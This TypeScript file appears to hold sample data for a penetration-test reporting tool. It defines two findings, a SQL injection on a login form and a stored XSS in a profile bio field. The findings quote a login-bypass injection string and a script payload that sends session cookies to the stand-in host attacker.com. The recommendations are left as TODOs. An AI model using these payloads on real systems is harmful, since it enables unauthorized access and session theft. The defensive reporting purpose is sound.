import type { Finding } from './types';

export const initialFindings: Finding[] = [
  {
    id: 'find-1',
    projectId: 'proj-1',
    vulnerabilityId: 'vuln-web-001',
    title: 'SQL Injection on Login Form',
    severity: 'Critical',
    cvss: 9.8,
    markdown: `### Technical Description
The 'username' parameter of the login POST request to /auth/login is vulnerable. By submitting a crafted payload like \`' OR '1'='1' --\`, an attacker can manipulate the backend SQL query to always return true, effectively logging in as the first user in the database (often an administrator).

---
### Affected Components
- \`/auth/login\` endpoint
- User authentication module

---
### Impact
Successful exploitation grants an attacker unauthorized access to the application. Depending on the user account compromised (e.g., an administrator), this could lead to a full application compromise, data exfiltration, and further attacks against the underlying infrastructure.

---
### Recommendations
[TODO: Add detailed recommendations]
`,
    createdAt: '2023-07-05T11:00:00Z',
    updatedAt: '2023-07-10T15:00:00Z'
  },
  {
    id: 'find-2',
    projectId: 'proj-1',
    vulnerabilityId: 'vuln-web-002',
    title: 'Stored Cross-Site Scripting (XSS) in User Profile',
    severity: 'High',
    cvss: 8.0,
    markdown: `### Technical Description
The 'bio' field in the user profile page does not properly sanitize user input before storing it in the database and rendering it on the page. An attacker can set their biography to a malicious script, such as \`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\`. When another user views the attacker's profile, the script will execute in their browser.

---
### Affected Components
- User profile page (e.g., /profile/{userId})
- 'bio' field update functionality

---
### Impact
This vulnerability can be used to steal session cookies, perform actions on behalf of other users (CSRF), redirect users to malicious websites, or deface the application. If an administrator's session is hijacked, it could lead to a full application compromise.

---
### Recommendations
[TODO: Add detailed recommendations]
`,
    createdAt: '2023-07-06T14:00:00Z',
    updatedAt: '2023-07-11T10:00:00Z'
  },
];
